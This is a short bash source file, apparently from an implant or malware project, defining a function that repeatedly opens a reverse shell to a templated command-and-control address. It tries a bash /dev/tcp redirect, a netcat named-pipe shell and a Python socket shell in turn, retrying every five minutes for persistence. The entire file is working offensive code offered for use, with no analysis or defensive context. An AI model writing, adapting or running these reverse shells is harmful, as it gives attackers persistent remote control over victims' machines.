#!/bin/bash

# src/connection.sh

function establish_connection() {
    # This function attempts to establish a reverse shell connection using various methods.
    # It will try bash, then netcat, then python.

    while true; do
        if command -v bash >/dev/null 2>&1; then
            # Bash reverse shell
            bash -i >& /dev/tcp/%%C2_IP%%/%%C2_PORT%% 0>&1
        elif command -v nc >/dev/null 2>&1; then
            # Netcat reverse shell
            rm -f /tmp/f; mkfifo /tmp/f
            cat /tmp/f | /bin/sh -i 2>&1 | nc %%C2_IP%% %%C2_PORT%% >/tmp/f
        elif command -v python >/dev/null 2>&1; then
            # Python reverse shell
            python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%%C2_IP%%",%%C2_PORT%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
        fi
        # Sleep for a while before retrying
        sleep 300
    done
}
